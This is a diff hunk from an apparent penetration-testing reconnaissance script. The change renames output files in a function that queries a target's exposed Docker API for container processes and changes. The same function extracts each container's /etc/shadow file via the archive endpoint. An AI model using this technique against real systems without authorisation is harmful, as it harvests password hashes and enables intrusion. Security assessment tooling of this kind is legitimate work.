@@ -867,12 +867,12 @@ function dockerScan()
     for id in $(grep '"Id": ' "$RECONDIR"/${TARGET}.dockercontainers |cut -d'"' -f4)
     do
         $TIMEOUT 60 curl http://${TARGET}:${port}/containers/${id}/top 2>/dev/null|jq -M . \
-            >> "$RECONDIR"/${TARGET}.${id}.dockertop
+            >> "$RECONDIR"/${TARGET}.dockertop.${id}
         $TIMEOUT 60 curl http://${TARGET}:${port}/containers/${id}/changes 2>/dev/null|jq -M . \
-            >> "$RECONDIR"/${TARGET}.${id}.dockerchanges
+            >> "$RECONDIR"/${TARGET}.dockerchanges.${id}
         $TIMEOUT 60 curl "http://${TARGET}:${port}/containers/${id}/archive?path=/etc/shadow" \
             2>/dev/null|tar xf - -O \
-            >> "$RECONDIR"/${TARGET}.${id}.dockershadow
+            >> "$RECONDIR"/${TARGET}.dockershadow.${id}
 
     done
 
